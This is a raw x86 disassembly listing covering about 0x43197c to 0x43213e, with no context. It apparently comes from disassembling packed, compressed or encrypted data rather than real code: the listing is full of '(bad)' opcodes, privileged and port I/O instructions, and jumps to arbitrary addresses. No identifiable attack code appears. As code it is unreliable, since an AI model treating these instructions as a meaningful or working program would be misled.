  43197c:	xor    eax,0xc1d6382d
  431981:	and    eax,0x9aaeeb8a
  431986:	mov    eax,ds:0x79e5af97
  43198b:	iret   
  43198c:	cmp    BYTE PTR [ebp-0x1d],al
  43198f:	inc    ebx
  431990:	bound  ebx,QWORD PTR [ecx+0x38]
  431993:	add    DWORD PTR ds:0x720ef4f0,ecx
  431999:	pop    esp
  43199a:	cdq    
  43199b:	(bad)  
  43199c:	jne    0x4319fc
  43199e:	mov    WORD PTR [ebp-0x6e4547d3],ss
  4319a4:	test   eax,0xe9bf34de
  4319a9:	xchg   ebx,eax
  4319aa:	mov    dl,0x3f
  4319ac:	mov    ah,0xe9
  4319ae:	mov    fs,WORD PTR [eax]
  4319b0:	xor    al,BYTE PTR [edx]
  4319b2:	add    BYTE PTR [edx+0x3ed277a5],bl
  4319b8:	lahf   
  4319b9:	(bad)  
  4319ba:	push   ss
  4319bb:	in     al,dx
  4319bc:	add    BYTE PTR ds:[eax],al
  4319bf:	add    BYTE PTR [eax],al
  4319c1:	add    BYTE PTR [eax-0x6c5702bc],ch
  4319c7:	cmp    DWORD PTR [ecx],ebp
  4319c9:	add    eax,0xda0ed0a5
  4319ce:	push   esp
  4319cf:	repnz xchg ecx,eax
  4319d1:	sub    DWORD PTR [eax+ebx*1],esi
  4319d4:	jnp    0x431983
  4319d6:	xchg   ebx,eax
  4319d7:	mov    ebx,0xf47e32a4
  4319dc:	lds    eax,FWORD PTR [eax]
  4319de:	jmp    0xad8:0x35090013
  4319e5:	xor    ecx,DWORD PTR [edx+ecx*2+0x77bc0471]
  4319ec:	das    
  4319ed:	and    al,0x99
  4319ef:	or     DWORD PTR [eax+0x24],edx
  4319f2:	dec    ebp
  4319f3:	cmp    eax,0xb6756c73
  4319f8:	xor    ecx,DWORD PTR ds:0x4f92cd
  4319fe:	sub    dh,ch
  431a00:	pop    ebx
  431a01:	push   esi
  431a02:	out    dx,al
  431a03:	lds    edx,FWORD PTR [edx-0x174b9b40]
  431a09:	ret    
  431a0a:	test   BYTE PTR [edi+ecx*1-0x73],ch
  431a0e:	fiadd  DWORD PTR gs:[esi]
  431a11:	push   eax
  431a12:	cmp    BYTE PTR [edx+0x2f],0x1c
  431a16:	pusha  
  431a17:	bound  esi,QWORD PTR [edi+0x44]
  431a1a:	jmp    0x9dbf33c9
  431a1f:	jp     0x431a0c
  431a21:	add    bh,BYTE PTR [eax]
  431a23:	inc    edi
  431a24:	cmp    eax,0xff
  431a29:	add    BYTE PTR [eax],al
  431a2b:	push   es
  431a2c:	cmp    BYTE PTR [ebx-0x5302148b],ch
  431a32:	push   DWORD PTR [esi+ebp*4+0x7b]
  431a36:	inc    esp
  431a37:	mov    ecx,0xc524400a
  431a3c:	imul   esi,DWORD PTR [ebx],0x73
  431a3f:	cmc    
  431a40:	mov    bl,0x93
  431a42:	into   
  431a43:	popa   
  431a44:	xchg   edi,eax
  431a45:	out    0xff,al
  431a47:	outs   dx,BYTE PTR ds:[esi]
  431a48:	cmp    ch,BYTE PTR [ebx-0x5302448b]
  431a4e:	jmp    DWORD PTR [edi+ebp*4+0xaa9447b]
  431a55:	inc    eax
  431a56:	and    al,0x85
  431a58:	imul   esi,DWORD PTR [edi],0x73
  431a5b:	nop
  431a5c:	pop    ebp
  431a5d:	ja     0xf8eacbb1
  431a63:	ja     0x431a1d
  431a65:	xchg   esi,eax
  431a66:	mov    edi,0xbe599be5
  431a6b:	or     al,0xa4
  431a6d:	(bad)  
  431a6e:	adc    al,0xe8
  431a70:	cdq    
  431a71:	(bad)  
  431a72:	call   DWORD PTR [edi-0x32]
  431a75:	pop    ecx
  431a76:	jae    0x431aec
  431a78:	mov    cl,0xa4
  431a7a:	cli    
  431a7b:	popf   
  431a7c:	inc    ecx
  431a7d:	fnstsw WORD PTR [edi]
  431a7f:	nop
  431a80:	lods   al,BYTE PTR ds:[esi]
  431a81:	push   edx
  431a82:	out    0x8c,al
  431a84:	add    al,0xd4
  431a86:	and    eax,DWORD PTR [eax-0x39a54a52]
  431a8c:	mov    ds:0xbdb7,al
  431a91:	add    BYTE PTR [eax],al
  431a93:	add    BYTE PTR [ecx+ebx*4+0x6e16ffc5],dl
  431a9a:	pop    es
  431a9b:	outs   dx,DWORD PTR ds:[esi]
  431a9c:	push   esp
  431a9d:	cdq    
  431a9e:	pop    edx
  431a9f:	adc    al,0x9c
  431aa1:	mov    edi,cs
  431aa3:	inc    DWORD PTR [esi]
  431aa5:	inc    ecx
  431aa6:	idiv   BYTE PTR [edi-0x7fb1af01]
  431aac:	cld    
  431aad:	xchg   esp,eax
  431aae:	or     eax,0x6bac9000
  431ab3:	inc    ebx
  431ab4:	mov    ah,0x69
  431ab6:	lahf   
  431ab7:	mov    WORD PTR [ebp+edi*4-0x2a],cs
  431abb:	dec    edi
  431abc:	sbb    esi,edx
  431abe:	push   edx
  431abf:	inc    ebx
  431ac0:	ins    BYTE PTR es:[edi],dx
  431ac1:	add    DWORD PTR [edi],0x5a999000
  431ac7:	adc    al,0xe8
  431ac9:	imul   ecx,edi,0xc4d914ff
  431acf:	or     DWORD PTR ds:0xd940332d,edx
  431ad5:	hlt    
  431ad6:	lldt   WORD PTR [eax+0x5ae2fdb2]
  431add:	mov    cs,WORD PTR [esi+esi*4]
  431ae0:	loope  0x431ac7
  431ae2:	jo     0x431af2
  431ae4:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431ae6:	mov    ch,0x3
  431ae8:	xor    eax,0x9003f6af
  431aed:	out    0xa8,eax
  431aef:	push   ebp
  431af0:	adc    al,0x37
  431af2:	(bad)  [edi+0x5f]
  431af5:	mov    ?,ebp
  431af7:	mov    ch,0x0
  431af9:	add    BYTE PTR [eax],al
  431afb:	add    BYTE PTR [eax],al
  431afd:	(bad)  
  431afe:	lea    ebp,[edi+eax*4-0x7f8540ad]
  431b05:	jae    0x431a91
  431b07:	cmc    
  431b08:	add    edx,DWORD PTR [eax+0x73986ee2]
  431b0e:	mov    ?,ebp
  431b10:	add    edx,DWORD PTR [eax-0x68fc3d73]
  431b16:	repnz cmc 
  431b18:	sbb    bh,0x7
  431b1b:	lock mov al,0x4
  431b1e:	aaa    
  431b1f:	fld    DWORD PTR [edi+0xf]
  431b22:	mov    ?,ebp
  431b24:	pop    esi
  431b25:	fwait
  431b26:	sbb    dh,dh
  431b28:	add    al,0x90
  431b2a:	mov    dl,0x4a
  431b2c:	xor    BYTE PTR [ebx-0x6ffc095e],0xe4
  431b33:	add    eax,0xb931c24b
  431b38:	clc    
  431b39:	or     al,0x27
  431b3b:	shl    DWORD PTR [edi-0x29],1
  431b3e:	(bad)  
  431b3f:	cmc    
  431b40:	mov    edx,gs
  431b42:	mov    dl,0xf5
  431b44:	add    edi,DWORD PTR [eax-0x45b4cc78]
  431b4a:	aas    
  431b4b:	mov    eax,ds:0x554b681f
  431b50:	add    al,0x90
  431b52:	mov    dl,0x3d
  431b54:	pop    eax
  431b55:	(bad)  [ebp-0xee6c9f2]
  431b5b:	xor    al,BYTE PTR [ecx]
  431b5d:	fdivr  QWORD PTR [esi]
  431b5f:	or     ch,0x0
  431b62:	add    BYTE PTR [eax],al
  431b64:	add    BYTE PTR [eax],al
  431b66:	xor    ecx,DWORD PTR [ebp+0x59ebe9eb]
  431b6c:	add    ecx,ebp
  431b6e:	xchg   ebx,eax
  431b6f:	aas    
  431b70:	inc    edx
  431b71:	lds    ebx,FWORD PTR [ebx-0x6c1612b5]
  431b77:	mov    dl,0x95
  431b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431b7a:	xchg   edx,edx
  431b7c:	mul    BYTE PTR [eax]
  431b7e:	call   0x6d1:0x505ceb88
  431b85:	cmp    DWORD PTR [esi-0x4e],ebp
  431b88:	inc    esp
  431b89:	ins    BYTE PTR es:[edi],dx
  431b8a:	(bad)  
  431b8b:	shl    DWORD PTR [esi-0x5a4d6c17],1
  431b91:	jmp    0x431b26
  431b93:	mov    dl,0x8e
  431b95:	sbb    ebp,esp
  431b97:	cmp    DWORD PTR [edx+0x5],esp
  431b9a:	test   BYTE PTR [ebx],bh
  431b9c:	pop    edx
  431b9d:	or     eax,0x5623b78
  431ba2:	jo     0x431b2d
  431ba4:	add    DWORD PTR [ecx+0x4],eax
  431ba7:	int    0xe
  431ba9:	fs push ebx
  431bab:	push   es
  431bac:	push   es
  431bad:	fs aas 
  431baf:	sar    esi,1
  431bb1:	cmp    BYTE PTR [edx+0x3e],al
  431bb4:	inc    edx
  431bb5:	int    0x83
  431bb7:	aas    
  431bb8:	pop    edx
  431bb9:	lds    esi,FWORD PTR [ebx-0x6c20d566]
  431bbf:	mov    dl,0x97
  431bc1:	cmc    
  431bc2:	ja     0x431b66
  431bc4:	imul   edx
  431bc6:	push   ss
  431bc7:	jne    0x431bb4
  431bc9:	push   0x0
  431bcb:	add    BYTE PTR [eax],al
  431bcd:	add    BYTE PTR [eax],al
  431bcf:	pop    ebx
  431bd0:	mov    BYTE PTR [edx-0x10],ah
  431bd3:	adc    BYTE PTR [ebp+0x62],cl
  431bd6:	hlt    
  431bd7:	add    esp,ebx
  431bd9:	js     0x431bdb
  431bdb:	mov    ebx,0x99244009
  431be0:	pop    edi
  431be1:	repz xlat BYTE PTR ds:[ebx]
  431be3:	retf   0xe8fa
  431be6:	mov    esi,DWORD PTR [edi-0x17]
  431be9:	into   
  431bea:	mov    ds:0x4494f8b6,al
  431bef:	dec    ebp
  431bf0:	pushf  
  431bf1:	call   0x69e2:0xa5a84d54
  431bf8:	mov    al,0xe
  431bfa:	mov    DWORD PTR ds:0x34e832ac,edi
  431c00:	retf   0xffe8
  431c03:	hlt    
  431c04:	or     esi,DWORD PTR [eax]
  431c06:	clc    
  431c07:	imul   esi,DWORD PTR [eax+0x6c89550e],0xd27d8ce9
  431c11:	or     bl,BYTE PTR [ecx+0x51]
  431c14:	sub    al,0x4c
  431c16:	inc    BYTE PTR [esi+0x4]
  431c19:	push   eax
  431c1a:	and    al,0x99
  431c1c:	ins    BYTE PTR es:[edi],dx
  431c1d:	adc    edx,DWORD PTR [eax-0x3d]
  431c20:	mov    ah,0x99
  431c22:	push   esp
  431c23:	(bad)  
  431c24:	(bad)  
  431c25:	inc    ebp
  431c26:	call   0x28b1e6
  431c2b:	test   BYTE PTR [edx+0x2f],dh
  431c2e:	dec    esp
  431c2f:	arpl   WORD PTR es:[edi],bp
  431c32:	adc    al,0x0
  431c34:	add    BYTE PTR [eax],al
  431c36:	add    BYTE PTR [eax],al
  431c38:	arpl   WORD PTR es:[edi],bp
  431c3b:	adc    al,0xb9
  431c3d:	add    edx,DWORD PTR [eax+0x24]
  431c40:	sub    eax,0x8a3c7140
  431c45:	out    dx,al
  431c46:	push   ebp
  431c47:	shl    BYTE PTR [ecx+edi*8+0x6c],1
  431c4b:	(bad)
  431c4f:	and    al,0x95
  431c51:	pop    ecx
  431c52:	inc    ebp
  431c53:	pop    ebp
  431c54:	cmp    bh,dh
  431c56:	push   cs
  431c57:	jge    0x431be9
  431c59:	xchg   ebp,eax
  431c5a:	push   0xffffffce
  431c5c:	stc    
  431c5d:	clc    
  431c5e:	adc    al,BYTE PTR [eax]
  431c60:	nop
  431c61:	loope  0x431ca5
  431c63:	int3   
  431c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431c65:	int3   
  431c66:	mov    ecx,0x119dd480
  431c6b:	add    BYTE PTR [eax+0x4f52a0d8],dl
  431c71:	std    
  431c72:	jmp    0x431c73
  431c74:	xchg   DWORD PTR [edx+ebp*2-0x10],eax
  431c78:	call   0x9082ae0e
  431c7d:	inc    ebx
  431c7e:	push   esi
  431c7f:	adc    al,0xcc
  431c81:	imul   ecx,edi,0xffffffff
  431c84:	sbb    bl,BYTE PTR [esi-0x662b90f5]
  431c8a:	adc    cl,BYTE PTR ds:0xffac0dd4
  431c90:	adc    bl,BYTE PTR [ebp-0x1d]
  431c93:	es push esi
  431c95:	(bad)  
  431c96:	jmp    0x431cc8
  431c98:	sbb    BYTE PTR [ebx+0x4acd],0x0
  431c9f:	add    BYTE PTR [eax],al
  431ca1:	mov    ebp,0x5359b664
  431ca6:	scas   al,BYTE PTR es:[edi]
  431ca7:	imul   ebp,ebx,0xfee77d11
  431cad:	pop    ds
  431cae:	cdq    
  431caf:	test   BYTE PTR fs:[eax],bl
  431cb2:	pop    ebx
  431cb3:	push   esi
  431cb4:	cli    
  431cb5:	data16 int3 
  431cb7:	imul   esi,ebp,0xb59f2a1b
  431cbd:	xor    al,0x9e
  431cbf:	(bad)  
  431cc1:	cmp    DWORD PTR [ecx+0x21903f91],edx
  431cc7:	pushf  
  431cc8:	outs   dx,BYTE PTR ds:[esi]
  431cc9:	out    0xb,eax
  431ccb:	imul   edx,DWORD PTR [edx],0xd
  431cce:	push   ds
  431ccf:	pop    eax
  431cd0:	stc    
  431cd1:	xlat   BYTE PTR ds:[ebx]
  431cd2:	sbb    esp,DWORD PTR [eax+0x3db1de86]
  431cd8:	xchg   esi,eax
  431cd9:	dec    edx
  431cda:	mov    WORD PTR [eax+eax*2-0x6e],cs
  431cde:	mov    dl,0xf7
  431ce0:	add    edx,DWORD PTR [eax+0x77cf3535]
  431ce6:	cmp    eax,0x8aa94b62
  431ceb:	sub    al,0xb2
  431ced:	inc    edx
  431cee:	aaa    
  431cef:	add    eax,0x398a0476
  431cf4:	dec    eax
  431cf5:	mov    bl,BYTE PTR [ebx-0x7576366b]
  431cfb:	jno    0x431d40
  431cfd:	add    edi,DWORD PTR [edx+0x3804f070]
  431d03:	std    
  431d04:	inc    esi
  431d05:	add    BYTE PTR [eax],al
  431d07:	add    BYTE PTR [eax],al
  431d09:	add    BYTE PTR [edx-0x76],ch
  431d0c:	std    
  431d0d:	add    al,BYTE PTR [esi]
  431d0f:	mov    ch,ah
  431d11:	pop    ebx
  431d12:	pop    ebp
  431d13:	lds    esi,FWORD PTR ds:0x387bb9a8
  431d19:	scas   al,BYTE PTR es:[edi]
  431d1a:	push   ss
  431d1b:	xchg   edi,eax
  431d1c:	jbe    0x431d76
  431d1e:	(bad)  
  431d1f:	mov    bl,0xf5
  431d21:	add    ecx,DWORD PTR ds:0x3a46bd30
  431d27:	mov    ah,BYTE PTR [ebx]
  431d29:	scas   eax,DWORD PTR es:[edi]
  431d2a:	push   ss
  431d2b:	test   DWORD PTR [eax+0x4d],esp
  431d2e:	xlat   BYTE PTR ds:[ebx]
  431d2f:	dec    esp
  431d30:	xchg   ecx,eax
  431d31:	add    DWORD PTR [eax-0x6a03a14e],edx
  431d37:	repnz cmc 
  431d39:	pop    ebx
  431d3a:	push   edi
  431d3b:	add    eax,0x301447b5
  431d40:	lods   eax,DWORD PTR ds:[esi]
  431d41:	inc    esi
  431d42:	cli    
  431d43:	mov    DWORD PTR ds:0x8c3de17b,esp
  431d49:	pop    esp
  431d4a:	scas   eax,DWORD PTR es:[edi]
  431d4b:	or     DWORD PTR [edi+eax*2-0x171e8cf4],edx
  431d52:	push   ss
  431d53:	loopne 0x431d63
  431d55:	loope  0x431daf
  431d57:	ss out 0x6f,al
  431d5a:	push   edi
  431d5b:	mov    WORD PTR ds:0x97bde166,?
  431d61:	xor    DWORD PTR [esp+edi*1+0x6c],ebx
  431d65:	push   edi
  431d66:	dec    edi
  431d67:	xor    eax,0xd990d5ce
  431d6c:	into   
  431d6d:	test   eax,0x0
  431d72:	add    BYTE PTR [edx-0x79],cl
  431d75:	and    BYTE PTR [ecx],ch
  431d77:	imul   ebx
  431d79:	aad    0x2b
  431d7b:	xchg   esp,eax
  431d7c:	mov    DWORD PTR [esi+0xeb3a03d],ecx
  431d82:	jmp    0xb687fbc9
  431d87:	or     BYTE PTR [ebp-0x206c16f3],ah
  431d8d:	jbe    0x431de8
  431d8f:	dec    edx
  431d90:	leave  
  431d91:	push   cs
  431d92:	je     0x431de4
  431d94:	aad    0x1e
  431d96:	cdq    
  431d97:	fidivr DWORD PTR [edi-0x69]
  431d9a:	adc    BYTE PTR [edi-0x4846cd0b],dl
  431da0:	xchg   ebp,eax
  431da1:	imul   esi,DWORD PTR [ecx],0xdeade1e4
  431da7:	(bad)  
  431da8:	fadd   st,st(0)
  431daa:	sbb    dh,BYTE PTR [ebp+0x2f]
  431dad:	push   edx
  431dae:	fisttp QWORD PTR [edi-0x7422ad3e]
  431db4:	repz pop ds
  431db6:	test   eax,0xe6128a12
  431dbb:	xlat   BYTE PTR ds:[ebx]
  431dbc:	jo     0x431e0e
  431dbe:	repnz rcl BYTE PTR [edi],0xf9
  431dc2:	adc    ecx,DWORD PTR [ebp-0x143aa5c9]
  431dc8:	nop
  431dc9:	arpl   WORD PTR [ecx],cx
  431dcb:	dec    esi
  431dcc:	mov    WORD PTR [edi+0xed2b005],cs
  431dd2:	add    BYTE PTR [eax+0x24500b],cl
  431dd8:	add    BYTE PTR [eax],al
  431dda:	add    BYTE PTR [eax],al
  431ddc:	int    0x44
  431dde:	call   0xa5fd:0xf390c54c
  431de5:	icebp  
  431de6:	call   0x29bc976f
  431deb:	(bad)  
  431dec:	in     eax,dx
  431ded:	test   al,0x2
  431def:	call   0x2b6196
  431df4:	xor    ah,ch
  431df6:	xchg   edx,eax
  431df7:	test   bh,0xa3
  431dfa:	and    edi,esi
  431dfc:	out    0x9f,eax
  431dfe:	xor    edi,esi
  431e00:	test   BYTE PTR [ebx-0x66],0x4c
  431e04:	xchg   ebp,eax
  431e05:	call   0x84e8:0xee19cdf3
  431e0c:	test   eax,0x37510577
  431e11:	or     edx,DWORD PTR [eax]
  431e13:	pop    ds
  431e14:	sub    DWORD PTR [ebx],ecx
  431e16:	pop    eax
  431e17:	and    al,0x59
  431e19:	in     al,dx
  431e1a:	cmp    eax,0x8fee5e55
  431e1f:	rcl    ch,0x8c
  431e22:	call   0x859f:0xf398554c
  431e29:	in     eax,dx
  431e2a:	call   0x5844611a
  431e2f:	and    al,0x35
  431e31:	in     al,dx
  431e32:	jg     0x431e88
  431e34:	pop    esi
  431e35:	out    dx,al
  431e36:	cmp    al,0xf6
  431e38:	test   bh,bh
  431e3a:	dec    edi
  431e3b:	and    al,0x8d
  431e3d:	ins    BYTE PTR es:[edi],dx
  431e3e:	jmp    0x431e8f
  431e40:	add    BYTE PTR [eax],al
  431e42:	add    BYTE PTR [eax],al
  431e44:	add    dh,bl
  431e46:	xchg   edi,eax
  431e47:	dec    ebx
  431e48:	push   ss
  431e49:	mov    ecx,0xfdc46bae
  431e4e:	or     cl,dh
  431e50:	pop    edi
  431e51:	mov    edi,0x9081444f
  431e56:	push   ebp
  431e57:	inc    BYTE PTR [eax]
  431e59:	nop
  431e5a:	cdq    
  431e5b:	dec    esi
  431e5c:	xor    ah,0xf5
  431e5f:	jmp    0x431e60
  431e61:	fild   QWORD PTR [esp+edi*4-0x227e627a]
  431e68:	aas    
  431e69:	nop
  431e6a:	mov    bl,0x2e
  431e6c:	xchg   ax,ax
  431e6e:	adc    BYTE PTR [eax+ebp*1],bl
  431e71:	adc    ecx,DWORD PTR [esi+0xf]
  431e74:	xchg   cl,bl
  431e76:	loopne 0x431eb4
  431e78:	test   al,dl
  431e7a:	pop    ebp
  431e7b:	loope  0x431e03
  431e7d:	fsub   st,st(1)
  431e7f:	call   0xaedcaeec
  431e84:	sbb    ecx,DWORD PTR [esi+edx*2]
  431e87:	movntq QWORD PTR [edi+0xc1c0c1c],mm2
  431e8e:	push   ebp
  431e8f:	lldt   WORD PTR [ebx]
  431e92:	repz or sp,0xff99
  431e97:	ud2    
  431e99:	adc    al,0x79
  431e9b:	adc    BYTE PTR [eax],al
  431e9d:	nop
  431e9e:	cli    
  431e9f:	retf   0xd46b
  431ea2:	cdq    
  431ea3:	mov    bh,bl
  431ea5:	xchg   DWORD PTR [ecx+0xb0f],ebx
  431eab:	add    BYTE PTR [eax],al
  431ead:	add    BYTE PTR [ecx+ebp*2],dl
  431eb0:	adc    BYTE PTR [eax],al
  431eb2:	nop
  431eb3:	and    cl,BYTE PTR [edi]
  431eb5:	or     BYTE PTR [eax-0x57ce2467],dl
  431ebb:	and    DWORD PTR [eax],edx
  431ebd:	add    BYTE PTR [eax+0x5dfb12f3],dl
  431ec3:	mov    eax,ds:0x4890438d
  431ec8:	cmp    DWORD PTR [eax+edx*2-0x3a051e3b],eax
  431ecf:	mov    cl,0xbd
  431ed1:	inc    ebx
  431ed2:	nop
  431ed3:	mov    dl,0x60
  431ed5:	cmp    esi,edi
  431ed7:	int    0x60
  431ed9:	inc    esp
  431eda:	cli    
  431edb:	call   0xe7e2:0x3ad010f7
  431ee2:	adc    ebp,esi
  431ee4:	cmc    
  431ee5:	js     0x431ebe
  431ee7:	cdq    
  431ee8:	push   edx
  431ee9:	fld    DWORD PTR fs:[esi-0x11c424aa]
  431ef0:	cmc    
  431ef1:	fwait
  431ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431ef3:	(bad)  
  431ef4:	jecxz  0x431f6c
  431ef6:	dec    ebx
  431ef7:	into   
  431ef8:	fstp   QWORD PTR [ebx+0x6]
  431efb:	test   DWORD PTR [esp+eax*2-0x10],eax
  431eff:	sbb    DWORD PTR [edx-0xaa65841],ebp
  431f05:	add    dl,BYTE PTR [eax+0x66e8a1b2]
  431f0b:	jb     0x431e92
  431f0d:	mov    dl,0x16
  431f0f:	mov    eax,0x7fd9
  431f14:	add    BYTE PTR [eax],al
  431f16:	add    bl,dl
  431f18:	mov    dl,0xa5
  431f1a:	fist   DWORD PTR [edx-0x1ffc4910]
  431f20:	call   0xdb56:0x866fdac8
  431f27:	sti    
  431f28:	out    dx,al
  431f29:	cmc    
  431f2a:	fwait
  431f2b:	lahf   
  431f2c:	(bad)  
  431f2d:	xchg   edi,eax
  431f2e:	lods   al,BYTE PTR ds:[esi]
  431f2f:	in     eax,dx
  431f30:	mov    dh,0x8f
  431f32:	add    ecx,DWORD PTR [ebx-0x40]
  431f35:	int    0x80
  431f37:	shl    DWORD PTR [edx+0x42fa5af4],cl
  431f3d:	cmp    al,0xc4
  431f3f:	aaa    
  431f40:	das    
  431f41:	mov    ch,0xb8
  431f43:	fwait
  431f44:	xor    DWORD PTR [ebp+0xc],edx
  431f47:	nop
  431f48:	cmp    ecx,DWORD PTR ds:0xf5ae5f4a
  431f4e:	cs adc eax,0x1fa90ec1
  431f54:	lahf   
  431f55:	or     ah,BYTE PTR [ebp-0x28]
  431f58:	test   DWORD PTR [eax-0x743f534f],ebx
  431f5e:	lahf   
  431f5f:	push   ebx
  431f60:	bndstx [ebx],bnd0
  431f63:	xchg   esp,eax
  431f64:	mov    DWORD PTR [ecx],esp
  431f66:	ror    DWORD PTR [esi],0xf2
  431f69:	push   cs
  431f6a:	xchg   BYTE PTR [edx],bh
  431f6c:	cs into 
  431f6e:	cmc    
  431f6f:	xchg   DWORD PTR ds:0x3b93e16f,eax
  431f75:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  431f77:	int3   
  431f78:	mov    cl,0xd
  431f7a:	push   edx
  431f7b:	add    BYTE PTR [eax],al
  431f7d:	add    BYTE PTR [eax],al
  431f7f:	add    BYTE PTR [esi-0x668d312b],dl
  431f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431f86:	xchg   edx,eax
  431f87:	lods   eax,DWORD PTR ds:[esi]
  431f88:	xchg   ebx,eax
  431f89:	sub    eax,0x298041d6
  431f8e:	in     al,dx
  431f8f:	inc    esi
  431f90:	xor    eax,0x93a57b0d
  431f95:	jmp    0xae90492c
  431f9a:	test   BYTE PTR [ebx],0xb7
  431f9d:	mov    ebp,ebx
  431f9f:	ins    DWORD PTR es:[edi],dx
  431fa0:	fild   WORD PTR [ecx]
  431fa2:	cmp    edi,DWORD PTR [eax+0x6d0ab606]
  431fa8:	pop    eax
  431fa9:	test   ebx,esi
  431fab:	mov    BYTE PTR [eax*4-0x56a68d15],dh
  431fb2:	xchg   edx,eax
  431fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431fb4:	xchg   ebx,eax
  431fb5:	das    
  431fb6:	in     al,0x7d
  431fb8:	test   eax,0x8501dc2d
  431fbd:	adc    BYTE PTR [edi],cl
  431fbf:	jmp    0x428f9ad2
  431fc4:	or     eax,0x93ecb271
  431fc9:	mov    dl,0xf5
  431fcb:	cli    
  431fcc:	repnz xchg ebx,ebp
  431fcf:	add    BYTE PTR [edi+0x65],dh
  431fd2:	mov    es,esp
  431fd4:	or     eax,0x3a000eba
  431fd9:	push   0xffffff94
  431fdb:	in     al,dx
  431fdc:	js     0x431fb3
  431fde:	pop    ss
  431fdf:	add    ch,cl
  431fe1:	mov    al,0x99
  431fe3:	inc    ebp
  431fe4:	add    BYTE PTR [eax],al
  431fe6:	add    BYTE PTR [eax],al
  431fe8:	add    BYTE PTR ds:0xa8503d5c,dl
  431fee:	xor    eax,0xf02232f9
  431ff3:	add    cl,BYTE PTR [ecx+edi*4+0x70]
  431ff7:	jmp    0x431f7d
  431ff9:	sub    DWORD PTR ds:0x4a46575f,edi
  431fff:	out    0xbf,eax
  432001:	lods   eax,DWORD PTR ds:[esi]
  432002:	lods   eax,DWORD PTR ds:[esi]
  432003:	push   cs
  432004:	add    cl,ah
  432006:	call   0x21ec6097
  43200b:	xchg   edx,eax
  43200c:	hlt    
  43200d:	inc    esp
  43200e:	lock call 0x9e1c096b
  432014:	int3   
  432015:	push   esp
  432016:	lock ins BYTE PTR es:[edi],dx
  432018:	les    edi,FWORD PTR [ecx+0x317eab39]
  43201e:	pop    edi
  43201f:	call   0x39ff:0xe8f2bd85
  432026:	pop    eax
  432027:	pop    ebx
  432028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432029:	sub    DWORD PTR [eax-0x523f2f6d],esi
  43202f:	push   cs
  432030:	add    cl,bh
  432032:	xlat   BYTE PTR ds:[ebx]
  432033:	outs   dx,DWORD PTR ds:[esi]
  432034:	adc    BYTE PTR [ecx-0x50],ch
  432037:	xchg   ecx,eax
  432038:	rcr    ch,0x94
  43203b:	ins    BYTE PTR es:[edi],dx
  43203c:	clc    
  43203d:	inc    esi
  43203e:	cmp    eax,0xbbac8d2d
  432043:	jmp    0xf915:0xe85f36ff
  43204a:	popf   
  43204b:	dec    esi
  43204c:	add    BYTE PTR [eax],al
  43204e:	add    BYTE PTR [eax],al
  432050:	add    BYTE PTR [eax],al
  432052:	nop
  432053:	push   cs
  432054:	xchg   esp,eax
  432055:	repz and eax,0xc6524d75
  43205b:	test   eax,0x67a8144d
  432060:	iret   
  432061:	call   DWORD PTR [edi+0xe]
  432064:	mov    esi,0xc51cbfa
  432069:	xlat   BYTE PTR ds:[ebx]
  43206a:	(bad)  
  43206b:	pop    eax
  43206c:	dec    ebp
  43206d:	je     0x432063
  43206f:	and    al,0x3
  432071:	je     0x431ff5
  432073:	fst    DWORD PTR [edx]
  432075:	pop    ebx
  432076:	inc    esi
  432077:	rsqrtps xmm2,XMMWORD PTR [esi-0x37]
  43207b:	pop    eax
  43207c:	mov    esp,0x412138fe
  432081:	icebp  
  432082:	iret   
  432083:	cld    
  432084:	xchg   esi,eax
  432085:	mov    edi,0xc8e1643c
  43208a:	test   al,0xdf
  43208c:	sub    edi,edx
  43208e:	mov    bh,0xe1
  432090:	std    
  432091:	outs   dx,DWORD PTR ds:[esi]
  432092:	nop
  432093:	cdq    
  432094:	pop    edi
  432095:	add    bl,dl
  432097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432098:	push   edx
  432099:	mov    esi,0xfa4dcea8
  43209e:	xchg   edi,eax
  43209f:	or     eax,0x6fb87353
  4320a4:	psubq  mm3,QWORD PTR [ebp-0x6fbffae7]
  4320ab:	add    BYTE PTR [ebx-0x49],bl
  4320ae:	lds    ebp,FWORD PTR [edi+0xf]
  4320b1:	add    dh,dh
  4320b3:	bound  edx,QWORD PTR [eax]
  4320b5:	jne    0x4320b7
  4320b7:	add    BYTE PTR [eax],al
  4320b9:	add    BYTE PTR [eax],al
  4320bb:	jl     0x4320cd
  4320bd:	sar    BYTE PTR [ebx],1
  4320bf:	adc    DWORD PTR [ebp+0x17],ebp
  4320c2:	push   eax
  4320c3:	int    0x99
  4320c5:	pcmpeqw mm3,QWORD PTR [eax+0x7807d710]
  4320cc:	cwde   
  4320cd:	push   eax
  4320ce:	cli    
  4320cf:	xor    BYTE PTR [edx-0x6609bbf8],dh
  4320d5:	jle    0x432117
  4320d7:	sub    al,BYTE PTR [ebx-0x521abbf8]
  4320dd:	cmc    
  4320de:	(bad)  
  4320df:	push   ss
  4320e0:	xchg   esi,eax
  4320e1:	js     0x432112
  4320e3:	scas   eax,DWORD PTR es:[edi]
  4320e4:	fild   WORD PTR [ebx]
  4320e6:	mul    dh
  4320e8:	mov    dl,0x6b
  4320ea:	xor    al,0x6d
  4320ec:	mov    al,0x70
  4320ee:	cmovne edi,esi
  4320f1:	pop    ecx
  4320f2:	ret    
  4320f3:	div    DWORD PTR ds:0x39f79c22
  4320f9:	jge    0x43213b
  4320fb:	jmp    0x6720:0xf79c0a34
  432102:	inc    eax
  432103:	fisubr DWORD PTR ds:0x3771b6b5
  432109:	icebp  
  43210a:	jbe    0x43214f
  43210c:	dec    esi
  43210d:	xor    eax,0x62b13604
  432112:	(bad)  
  432113:	pop    ds
  432114:	call   0xce72:0x82aa3bc0
  43211b:	call   FWORD PTR [ecx+0x35c1]
  432121:	add    BYTE PTR [eax],al
  432123:	add    BYTE PTR [edx+0x1c437982],bl
  432129:	mov    ecx,0x7e0f442b
  43212e:	cli    
  43212f:	mov    ch,0x4b
  432131:	mov    ?,edi
  432133:	jae    0x4320c5
  432135:	loopne 0x432107
  432137:	dec    edx
  432138:	ss call 0x9731509e
  43213e:	std    
